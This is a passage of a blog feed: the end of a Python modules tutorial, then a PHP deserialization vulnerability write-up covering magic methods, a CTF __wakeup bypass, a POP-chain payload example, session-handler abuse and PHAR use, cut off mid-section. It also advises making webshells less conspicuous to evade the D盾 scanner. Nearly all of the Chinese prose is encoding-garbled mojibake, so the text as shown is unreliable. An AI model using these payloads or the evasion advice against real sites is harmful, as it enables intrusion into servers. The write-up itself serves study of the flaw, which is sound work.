id="from-â€¦-import-è¯­å¥"><a class="header-anchor" href="#from-â€¦-import-è¯­å¥">ğŸ­</a>from â€¦ import è¯­å¥</h4><p>ä»æ¨¡å—ä¸­å¯¼å…¥ä¸€ä¸ªæŒ‡å®šçš„éƒ¨åˆ†åˆ°å½“å‰å‘½åç©ºé—´ä¸­ï¼š</p><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> name1[, name2[, ... nameN]]eg: <span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib, fib2<span class="hljs-comment">//ä¸ä¼šæŠŠæ•´ä¸ªfiboæ¨¡å—å¯¼å…¥åˆ°å½“å‰çš„å‘½åç©ºé—´ä¸­ï¼Œå®ƒåªä¼šå°†fiboé‡Œçš„fibå‡½æ•°å¼•å…¥è¿›æ¥</span><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> *<span class="hljs-comment">//æŠŠä¸€ä¸ªæ¨¡å—çš„æ‰€æœ‰å†…å®¹å…¨éƒ½å¯¼å…¥åˆ°å½“å‰çš„å‘½åç©ºé—´</span></code></pre><h4 id="name-å±æ€§"><a class="header-anchor" href="#name-å±æ€§">ğŸ­</a>__name__å±æ€§</h4><ul><li>ä¸€ä¸ªæ¨¡å—è¢«å¦ä¸€ä¸ªç¨‹åºç¬¬ä¸€æ¬¡å¼•å…¥æ—¶ï¼Œå…¶ä¸»ç¨‹åºå°†è¿è¡Œã€‚å¦‚æœæˆ‘ä»¬æƒ³åœ¨æ¨¡å—è¢«å¼•å…¥æ—¶ï¼Œæ¨¡å—ä¸­çš„æŸä¸€ç¨‹åºå—ä¸æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨__name__å±æ€§æ¥ä½¿è¯¥ç¨‹åºå—ä»…åœ¨è¯¥æ¨¡å—è‡ªèº«è¿è¡Œæ—¶æ‰§è¡Œ</li><li>æ¯ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ª__name__å±æ€§ï¼Œå½“å…¶å€¼æ˜¯â€™<strong>main</strong>â€™æ—¶ï¼Œè¡¨æ˜è¯¥æ¨¡å—è‡ªèº«åœ¨è¿è¡Œï¼Œå¦åˆ™æ˜¯è¢«å¼•å…¥ã€‚</li></ul><h4 id="dir-å‡½æ•°"><a class="header-anchor" href="#dir-å‡½æ•°">ğŸ­</a>dir() å‡½æ•°</h4><p>å†…ç½®çš„å‡½æ•° dir() å¯ä»¥æ‰¾åˆ°æ¨¡å—å†…å®šä¹‰çš„æ‰€æœ‰åç§°ã€‚ä»¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨çš„å½¢å¼è¿”å›.</p><h4 id="sysæ¨¡å—"><a class="header-anchor" href="#sysæ¨¡å—">ğŸ­</a>sysæ¨¡å—</h4><p>å†…ç½®äºæ¯ä¸€ä¸ª Python è§£æå™¨ä¸­ï¼Œå˜é‡ sys.ps1 å’Œ sys.ps2 å®šä¹‰äº†ä¸»æç¤ºç¬¦å’Œå‰¯æç¤ºç¬¦æ‰€å¯¹åº”çš„å­—ç¬¦ä¸²:</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; import sys<span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps2<span class="hljs-string">&#x27;... &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1 = <span class="hljs-string">&#x27;C&gt; </span><span class="hljs-string">C&gt; </span></code></pre><h4 id="åŒ…"><a class="header-anchor" href="#åŒ…">ğŸ­</a>åŒ…</h4><p>ä¸€ç§ç®¡ç† Python æ¨¡å—å‘½åç©ºé—´çš„å½¢å¼ï¼Œé‡‡ç”¨&quot;ç‚¹æ¨¡å—åç§°&quot;ã€‚è‹¥ä¸€ä¸ªæ¨¡å—çš„åç§°æ˜¯ A.Bï¼Œ é‚£ä¹ˆä»–è¡¨ç¤ºä¸€ä¸ªåŒ… Aä¸­çš„å­æ¨¡å— B ã€‚å¯é¿å…ä¸åŒæ¨¡å—ä¹‹é—´çš„å…¨å±€å˜é‡ç›¸äº’å½±å“æˆ–ä¸åŒåº“ä¹‹é—´çš„æ¨¡å—é‡åã€‚</p><p>å¯¼å…¥åŒ…æ—¶ï¼ŒPython ä¼šæ ¹æ® sys.path ä¸­çš„ç›®å½•æ¥å¯»æ‰¾è¿™ä¸ªåŒ…ä¸­åŒ…å«çš„å­ç›®å½•ã€‚</p><p>ç›®å½•åªæœ‰åŒ…å«ä¸€ä¸ªå«åš <strong>init</strong>.py çš„æ–‡ä»¶æ‰ä¼šè¢«è®¤ä½œæ˜¯ä¸€ä¸ªåŒ…</p><p><strong>å¯¼å…¥æ–¹æ³•</strong></p><ul><li>åªå¯¼å…¥ä¸€ä¸ªåŒ…é‡Œé¢çš„ç‰¹å®šæ¨¡å—</li><li>å¯¼å…¥å­æ¨¡å—</li><li>ç›´æ¥å¯¼å…¥ä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡</li></ul><p><strong>æ³¨</strong>ï¼š</p><p><em><code>from package import item</code>ä»¥è¿™ç§å½¢å¼å¯¼å…¥æ—¶ï¼Œå¯¹åº”çš„ item æ—¢å¯ä»¥æ˜¯åŒ…é‡Œé¢çš„å­æ¨¡å—ï¼ˆå­åŒ…ï¼‰ï¼Œæˆ–è€…åŒ…é‡Œé¢å®šä¹‰çš„å…¶ä»–åç§°ï¼Œæ¯”å¦‚å‡½æ•°ï¼Œç±»æˆ–è€…å˜é‡ã€‚ï¼ˆå…ˆæŠŠ item å½“ä½œä¸€ä¸ªåŒ…å®šä¹‰çš„åç§°ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå†è¯•å›¾æŒ‰ç…§ä¸€ä¸ªæ¨¡å—å»å¯¼å…¥ã€‚å¦‚æœè¿˜æ²¡æ‰¾åˆ°ï¼Œå°± <strong>:exc:ImportError</strong> å¼‚å¸¸ï¼‰</em></p><p><em><code>import item.subitem.subsubitem</code> è¿™ç§å¯¼å…¥å½¢å¼ï¼Œé™¤äº†æœ€åä¸€é¡¹ï¼Œéƒ½å¿…é¡»æ˜¯åŒ…ï¼Œè€Œæœ€åä¸€é¡¹åˆ™å¯ä»¥æ˜¯æ¨¡å—æˆ–è€…æ˜¯åŒ…ï¼Œä½†æ˜¯ä¸å¯ä»¥æ˜¯ç±»ï¼Œå‡½æ•°æˆ–è€…å˜é‡çš„åå­—ã€‚</em></p><p><em><code>from sound.effects import </code>:è‹¥å®šä¹‰æ–‡ä»¶ <strong><strong>init</strong>.py</strong> å­˜åœ¨ä¸€ä¸ªå«åš <strong><strong>all</strong></strong> çš„åˆ—è¡¨å˜é‡ï¼Œä¼šæŠŠè¿™ä¸ªåˆ—è¡¨ä¸­çš„æ‰€æœ‰åå­—ä½œä¸ºåŒ…å†…å®¹å¯¼å…¥ï¼ˆ Windowsç³»ç»Ÿä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼›è‹¥ <strong><strong>all</strong></strong> æ— å®šä¹‰ï¼Œå°±ä¸ä¼šå¯¼å…¥åŒ… é‡Œçš„ä»»ä½•å­æ¨¡å—ã€‚è€Œæ˜¯æŠŠåŒ…å’Œå®ƒé‡Œé¢å®šä¹‰çš„æ‰€æœ‰å†…å®¹å¯¼å…¥ã€‚</em></p><h4 id="å¸¸ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…"><a class="header-anchor" href="#å¸¸ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…">ğŸ­</a>å¸¸ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…</h4><blockquote><p><code>IPython</code> - æ›´å¥½çš„äº¤äº’å¼ Python è§£é‡Šå™¨<br><code>requests</code> - æä¾›æ˜“äºä½¿ç”¨çš„æ–¹æ³•æ¥å‘å‡ºç½‘ç»œè¯·æ±‚ã€‚é€‚ç”¨äºè®¿é—®ç½‘ç»œ APIã€‚<br><code>Flask</code> - ä¸€ä¸ªå°å‹æ¡†æ¶ï¼Œç”¨äºæ„å»ºç½‘ç»œåº”ç”¨å’Œ APIã€‚<br><code>Django </code>- ä¸€ä¸ªåŠŸèƒ½æ›´ä¸°å¯Œçš„ç½‘ç»œåº”ç”¨æ„å»ºæ¡†æ¶ã€‚Django å°¤å…¶é€‚åˆè®¾è®¡å¤æ‚ã€å†…å®¹ä¸°å¯Œçš„ç½‘ç»œåº”ç”¨ã€‚<br><code>Beautiful Soup</code> - ç”¨äºè§£æ HTML å¹¶ä»ä¸­æå–ä¿¡æ¯ã€‚é€‚åˆç½‘é¡µæ•°æ®æŠ½å–ã€‚<br><code>pytest</code> - æ‰©å±•äº† Python çš„å†…ç½®æ–­è¨€ï¼Œå¹¶ä¸”æ˜¯æœ€å…·å•å…ƒæ€§çš„æ¨¡å—ã€‚<br><code>PyYAML </code>- ç”¨äºè¯»å†™ YAML æ–‡ä»¶ã€‚<br><code>NumPy </code>- ç”¨äºä½¿ç”¨ Python è¿›è¡Œç§‘å­¦è®¡ç®—çš„æœ€åŸºæœ¬è½¯ä»¶åŒ…ã€‚å®ƒåŒ…å«ä¸€ä¸ªå¼ºå¤§çš„ N ç»´æ•°ç»„å¯¹è±¡å’Œå®ç”¨çš„çº¿æ€§ä»£æ•°åŠŸèƒ½ç­‰ã€‚<br><code>pandas </code>- åŒ…å«é«˜æ€§èƒ½ã€æ•°æ®ç»“æ„å’Œæ•°æ®åˆ†æå·¥å…·çš„åº“ã€‚å°¤å…¶æ˜¯ï¼Œpandas æä¾› dataframeï¼<br><code>matplotlib</code> - äºŒç»´ç»˜åˆ¶åº“ï¼Œä¼šç”Ÿæˆè¾¾åˆ°å‘å¸ƒæ ‡å‡†çš„é«˜å“è´¨å›¾ç‰‡ï¼Œå¹¶ä¸”é‡‡ç”¨å„ç§ç¡¬æ‹·è´æ ¼å¼å’Œäº¤äº’å¼ç¯å¢ƒã€‚<br><code>ggplot </code>- å¦ä¸€ç§äºŒç»´ç»˜åˆ¶åº“ï¼ŒåŸºäº Râ€™s ggplot2 åº“ã€‚<br><code>Pillow - Python</code> å›¾ç‰‡åº“å¯ä»¥å‘ä½ çš„ Python è§£é‡Šå™¨æ·»åŠ å›¾ç‰‡å¤„ç†åŠŸèƒ½ã€‚<br><code>pyglet </code>- ä¸“é—¨é¢å‘æ¸¸æˆå¼€å‘çš„è·¨å¹³å°åº”ç”¨æ¡†æ¶ã€‚<br><code>Pygame</code> - ç”¨äºç¼–å†™æ¸¸æˆçš„ä¸€ç³»åˆ— Python æ¨¡å—ã€‚<br><code>pytz - Python</code> çš„ä¸–ç•Œæ—¶åŒºå®šä¹‰ã€‚</p></blockquote><p>åŸºç¡€çŸ¥è¯†å¤§æ¦‚å°±è¿™äº›ğŸ’–ğŸ’–ğŸ’–</p><p><strong>è„šæœ¬</strong></p><p>ä¸ä¸€èˆ¬ç¨‹åºçš„ä¸»è¦åŒºåˆ«åœ¨äºæ˜¯å¦ç¼–è¯‘ã€‚ç›¸å¯¹äºç¨‹åºè€Œè¨€ï¼Œè„šæœ¬æ›´åŠ éšæ€§ã€‚è„šæœ¬å¯ä»¥ç›´æ¥åœ¨æŸç§å…·æœ‰è§£é‡ŠåŠŸèƒ½çš„ç¯å¢ƒä¸­è¿è¡Œã€‚</p><p><strong>æ–‡æœ¬ç¼–è¾‘å™¨</strong></p><ul><li><a href="https://code.visualstudio.com/download">Visual Studio Code</a></li><li><a href="http://www.sublimetext.com/">Sublime Text</a></li><li><a href="https://notepad-plus-plus.org/">Notepad++</a></li><li><a href="https://atom.io/">Atom</a></li></ul><p>ä¸Šé¢è¿™å››ä¸ªéƒ½æŒºå¥½ç”¨çš„ï¼Œ<code>VS code</code>æˆ‘æ˜¯ç”¨æ¥æŸ¥çœ‹æºç ï¼Œ<code>notepad</code>å’Œ<code>sublime</code>ç”¨æ¥ç¼–å†™ä»£ç ï¼Œ<code>atom</code>åŠŸèƒ½æ¯”è¾ƒå…¨æ˜¯ç”±GitHubæ„å»ºçš„ä¸€ä¸ªå¼ºå¤§çš„äº¤äº’å¼å¼€å‘ç¯å¢ƒğŸ’¯ğŸ’¯ğŸ’¯ï¼ŒLinuxé‡Œè¿˜æœ‰<code>emacs</code>å’Œ<code>vim</code>å¯ç”¨.</p><p>ç»“æŸâ˜€ï¸â˜€ï¸â˜€ï¸â˜€ï¸</p><p>å‚è€ƒï¼š<a href="https://www.runoob.com/python3">èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://blog.csdn.net/reallyr/article/details/87364399">pythonè„šæœ¬ç¼–å†™</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2021/02/14/re/"/>
    <url>/2021/02/14/re/</url>
    
    <content type="html"><![CDATA[<h2 id="phpé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼š"><a class="header-anchor" href="#phpé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼š">ğŸ­</a>phpé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼š</h2><ul><li>å¯¹è±¡ï¼šå¯ä»¥å¯¹å…¶åšäº‹æƒ…çš„ä¸€äº›ä¸œè¥¿ã€‚ä¸€ä¸ªå¯¹è±¡æœ‰<strong>çŠ¶æ€ã€è¡Œä¸ºå’Œæ ‡è¯†</strong>ä¸‰ç§å±æ€§ã€‚</li><li>ç±»ï¼šä¸€ä¸ªå…±äº«ç›¸åŒç»“æ„å’Œè¡Œä¸ºçš„å¯¹è±¡çš„é›†åˆã€‚æ¯ä¸ªç±»çš„å®šä¹‰éƒ½ä»¥å…³é”®å­—classå¼€å¤´ï¼Œåé¢è·Ÿç€ç±»çš„åå­—ã€‚ä¸€ä¸ªç±»å¯ä»¥åŒ…å«æœ‰å±äºè‡ªå·±çš„å˜é‡ï¼Œå˜é‡ï¼ˆç§°ä¸ºâ€œå±æ€§â€ï¼‰ä»¥åŠå‡½æ•°ï¼ˆâ€œç§°ä¸ºæ–¹æ³•â€ï¼‰ç±»å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚</li></ul><h2 id="åºåˆ—åŒ–"><a class="header-anchor" href="#åºåˆ—åŒ–">ğŸ­</a>åºåˆ—åŒ–</h2><p>å°†ä¸€ä¸ªå¯¹è±¡ã€æ•°ç»„ã€å­—ç¬¦ä¸²ç­‰è½¬åŒ–ä¸ºå­—èŠ‚æµä¾¿äºä¼ è¾“ã€‚åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨,ä½†åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•ã€‚</p><p><strong>serialize()</strong></p><p>æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²ï¼Œè¯¥å‡½æ•°ä¼šå…ˆæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>,å¦‚æœå­˜åœ¨ï¼Œ<code>__sleep()</code>æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ,å¯ä»¥åœ¨<code>__sleep()</code>æ–¹æ³•é‡Œå¯ä»¥å†³å®šå“ªäº›å±æ€§è¢«åºåˆ—åŒ–ã€‚å…ˆå†™ä¸ªä»£ç æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2021/02/14/re/1.png" alt="1"></p><p>è¿è¡Œç»“æœï¼š</p><img src="/2021/02/14/re/2.jpg" alt="2" style="zoom:67%;"><ul><li>O:ä»£è¡¨object</li><li>1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</li><li>S:å¯¹è±¡çš„åç§°</li><li>1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</li><li>s:æ•°æ®ç±»å‹</li><li>4:å˜é‡åç§°çš„é•¿åº¦</li><li>test:å˜é‡åç§°</li><li>s:æ•°æ®ç±»å‹</li><li>12:å˜é‡å€¼çš„é•¿åº¦</li><li>Genius is me:å˜é‡å€¼</li></ul><p>é¢å¤–ä»‹ç»ä¸€ä¸ªçŸ¥è¯†ğŸ˜ğŸ˜ğŸ˜</p><p><strong>å±æ€§</strong></p><ul><li><code>public</code></li><li><code>protected</code>,è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ%00*%00å±æ€§å</li><li><code>private</code>,è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ%00ç±»å%00å±æ€§å</li></ul><h2 id="ååºåˆ—åŒ–"><a class="header-anchor" href="#ååºåˆ—åŒ–">ğŸ­</a>ååºåˆ—åŒ–</h2><p>å°†åºåˆ—åŒ–ä¹‹åçš„å­—èŠ‚æµè¿˜åŸæˆå¯¹è±¡ã€å­—ç¬¦ã€æ•°ç»„ç­‰.</p><p><strong>unserialize ()</strong></p><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code> __wakeup()</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šå…ˆè°ƒç”¨<code>__wakeup()</code>æ–¹æ³•åœ¨è¿›è¡Œååºåˆ—åŒ–å¯ä»¥å†__wakeup()æ–¹æ³•ä¸­å¯¹å±æ€§è¿›è¡Œåˆå§‹åŒ–æˆ–è€…æ”¹å˜ã€‚</p><h2 id="PHPååºåˆ—åŒ–æ¼æ´"><a class="header-anchor" href="#PHPååºåˆ—åŒ–æ¼æ´">ğŸ­</a>PHPååºåˆ—åŒ–æ¼æ´</h2><p>PHPååºåˆ—åŒ–æ¼æ´åˆç§°PHPå¯¹è±¡æ³¨å…¥ã€‚åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸­å­˜åœ¨é­”æ³•å‡½æ•°ï¼Œä½¿ç”¨unserialize()å‡½æ•°åŒæ—¶ä¹Ÿä¼šè§¦å‘ã€‚ä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶unserialize()å…¥å£ï¼Œå°±å¯èƒ½å¼•å‘å¯¹è±¡æ³¨å…¥æ¼æ´ã€‚</p><p><strong>é­”æœ¯æ–¹æ³•ï¼š</strong></p><ul><li><p><code> __wakeup (void)</code></p></li><li><p><code>__sleep()</code></p></li><li><p><code> __construct ([ mixed $args [, $... ]])</code></p><p>å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚</p></li><li><p><code>__destruct ( void )</code></p><p>ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</p></li><li><p><code>public string __toString ( void )</code></p><p><code>__toString( ) </code>æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚<strong>æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</strong></p></li></ul><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2021/02/14/re/3.png" alt="3"></p><p>æµ‹è¯•ç»“æœ</p><img src="/2021/02/14/re/4.jpg" alt="4" style="zoom:67%;"><p>ç”±ç»“æœå¯ä»¥çœ‹å‡ºå„å‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a class="header-anchor" href="#æ¼æ´åˆ©ç”¨">ğŸ­</a>æ¼æ´åˆ©ç”¨</h2><h4 id="wakeup-ç›´æ¥åˆ©ç”¨"><a class="header-anchor" href="#wakeup-ç›´æ¥åˆ©ç”¨">ğŸ­</a>__wakeup()ç›´æ¥åˆ©ç”¨</h4><p>å½“ä¸€äº›æ¼æ´/å±å®³ä»£ç åœ¨<code>__wakeup() </code>ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²ç›´æ¥è§¦å‘å®ƒä»¬ã€‚</p><p><img src="/2021/02/14/re/5.png" alt="5"></p><p>æµ‹è¯•ï¼š</p><img src="/2021/02/14/re/6.jpg" alt="6" style="zoom: 50%;"><p>ä½†æ˜¯Dç›¾ä¸€èˆ¬å¯ä»¥æ£€æµ‹å‡ºå®ƒï¼Œæ‰€ä»¥è¦å°½å¯èƒ½çš„æ„é€ ä¸€ä¸ªä¸é‚£ä¹ˆæ˜æ˜¾çš„ğŸã€‚</p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨åˆ«çš„å‡½æ•°æ„é€ evalè¯­å¥ï¼š</p><p><img src="/2021/02/14/re/7.png" alt="7"></p><p>æ‰§è¡Œç»“æœï¼š</p><img src="/2021/02/14/re/8.jpg" alt="8" style="zoom:67%;"><h4 id="wakeup-ç»•è¿‡"><a class="header-anchor" href="#wakeup-ç»•è¿‡">ğŸ­</a>__wakeup( )ç»•è¿‡</h4><p>å¤šæ•°æƒ…å†µä¸‹ä»£ç æ— æ³•æ”¾å…¥wakeupåˆ©ç”¨ï¼Œè¿™æ—¶å€™å°±è¦è€ƒè™‘ç»•è¿‡å®ƒã€‚ååºåˆ—åŒ–æ—¶ï¼Œ<strong>å¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeup( )çš„æ‰§è¡Œã€‚</strong></p><p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <span class="hljs-keyword">public</span> $flag = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);&#125;&#125; <span class="hljs-comment">//?code=</span><span class="hljs-meta">?&gt;</span></code></pre><p>åºåˆ—åŒ–å¾—åˆ°<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>,ç›´æ¥è¾“å…¥æ˜¾ç„¶ä¸è¡Œï¼Œéœ€å°†1æ”¹ä¸º2ï¼ˆå¤§äºä¸€çš„æ•°çš†å¯ï¼‰ä»è€Œç»•è¿‡wakeup.</p><h4 id="æ„é€ -POP-é“¾ï¼ˆåŒåæ–¹æ³•åˆ©ç”¨ï¼‰"><a class="header-anchor" href="#æ„é€ -POP-é“¾ï¼ˆåŒåæ–¹æ³•åˆ©ç”¨ï¼‰">ğŸ­</a>æ„é€  POP é“¾ï¼ˆåŒåæ–¹æ³•åˆ©ç”¨ï¼‰</h4><p>PHP ååºåˆ—åŒ–æ¡ä»¶ï¼š</p><ul><li><strong>unserialize()</strong> å‚æ•°å€¼å¯æ§ï¼ˆè¿˜å¯ä»¥æ˜¯ phar åè®®ï¼‰</li><li>è°ƒç”¨å±é™©å‡½æ•°è·¯å¾„å¯é€šã€‚ï¼ˆå°±æ˜¯æ‰¾æ”»å‡»ç‚¹ï¼‰</li></ul><p>å¼•ç”¨ lemon å¸ˆå‚…çš„demoï¼š</p><p><img src="/2021/02/14/re/9.png" alt="9"></p><p>è·å–åºåˆ—åŒ–çš„å­—ç¬¦ä¸²</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ClassObj;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> evil();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;    <span class="hljs-keyword">private</span> $data = <span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> lemon()));<span class="hljs-meta">?&gt;</span></code></pre><p>æ‰§è¡Œç»“æœï¼š</p><img src="/2021/02/14/re/10.jpg" alt="10" style="zoom: 50%;"><p>å‚è€ƒï¼š<a href="http://aiyuanzhen.com/index.php/archives/346/#menu_index_15">æµ…æ PHP ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸å®¡è®¡</a></p><h4 id="Sessionååºåˆ—åŒ–æ¼æ´"><a class="header-anchor" href="#Sessionååºåˆ—åŒ–æ¼æ´">ğŸ­</a>Sessionååºåˆ—åŒ–æ¼æ´</h4><p>ç›¸å…³é…ç½®:</p><p>PHPä¸­çš„Sessionç»åºåˆ—åŒ–åå­˜å‚¨ï¼Œè¯»å–æ—¶å†è¿›è¡Œååºåˆ—åŒ–</p><ul><li><code>session.save_path</code></li><li><code>session.save_handler</code>//è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°</li><li><code>session.auto_start boolen </code>//æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯</li><li><code>session.serialize_handler string</code>//å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—</li></ul><p>ä»£ç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start();$_SESSION[<span class="hljs-string">&#x27;test&#x27;</span>]=$_GET[<span class="hljs-string">&#x27;test&#x27;</span>];<span class="hljs-keyword">echo</span> session_id();<span class="hljs-meta">?&gt;</span></code></pre><p>è®¿é—®å¾—åˆ°session_idå€¼</p><p><img src="/2021/02/14/re/11.jpg" alt="11"></p><p>æŸ¥æ‰¾<code>session.save_path</code>é…ç½®</p><p><img src="/2021/02/14/re/12.jpg" alt="12"></p><p>æŸ¥æ‰¾æ–‡ä»¶</p><p><img src="/2021/02/14/re/13.jpg" alt="13"></p><p>å°†å…¶å‘½åå¹¶å­˜å‚¨å†…å®¹ä¸ºåºåˆ—åŒ–åçš„sessionã€‚</p><p>PHPæœ‰ä¸‰ç§åºåˆ—åŒ–å¤„ç†å™¨ï¼š</p><ul><li><code>php</code></li><li><code>php_binary</code></li><li><code>php_serialize</code></li></ul><p>ä¸åŒå¤„ç†å™¨çš„æ ¼å¼ä¸åŒï¼Œå½“ä¸åŒé¡µé¢ä½¿ç”¨äº†ä¸åŒçš„å¤„ç†å™¨æ—¶ï¼Œç”±äºå¤„ç†çš„Sessionåºåˆ—åŒ–æ ¼å¼ä¸åŒï¼Œå°±å¯èƒ½äº§ç”Ÿååºåˆ—åŒ–æ¼æ´ã€‚</p><p>æ€è·¯ï¼šæˆ‘ä»¬å¯ä»¥åˆ†åˆ«å†™ä¸¤ä¸ªä»£ç ï¼Œä¸¤ä¸ªä»£ç è¿ç”¨ä¸åŒçš„åºåˆ—åŒ–å¤„ç†å™¨å¤„ç†ç›¸åŒçš„ç±»æ¥è¯¯å¯¼â€å¤„ç†å™¨ã€‚</p><h2 id="PHARåˆ©ç”¨"><a class="header-anchor" href="#PHARåˆ©ç”¨">ğŸ­</a>PHARåˆ©ç”¨</h2><p>PHAR (â€œ<code>Php ARchive</code>â€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œè¿™ä¸ªç‰¹æ€§ä½¿å¾—  PHPä¹Ÿå¯ä»¥åƒ Java ä¸€æ ·æ–¹ä¾¿åœ°å®ç°åº”ç”¨ç¨‹åºæ‰“åŒ…å’Œç»„ä»¶åŒ–ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥æ‰“æˆä¸€ä¸ª Phar åŒ…ï¼Œç›´æ¥æ”¾åˆ° PHP-FPM ä¸­è¿è¡Œ</p><p>pharè¯¦è§:<a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">PHPå¼€å‘å¸¸è¯†ï¼šä»€ä¹ˆæ˜¯Phar?</a>è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ã€‚</p><p><strong>PHARæ–‡ä»¶ç»“æ„</strong></p><ul><li><code>stub </code>ï¼Œæ–‡ä»¶å¤´</li><li><code>manifest describing the contents </code>,æ–‡ä»¶æè¿°è¯¥éƒ¨åˆ†å­˜å‚¨æ–‡ä»¶åã€æ–‡ä»¶å¤§å°ç­‰ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</li><li><code>the file contents</code>,æ–‡ä»¶å†…å®¹</li><li><code>[optional] a signature for verifying Phar integrity (phar file format 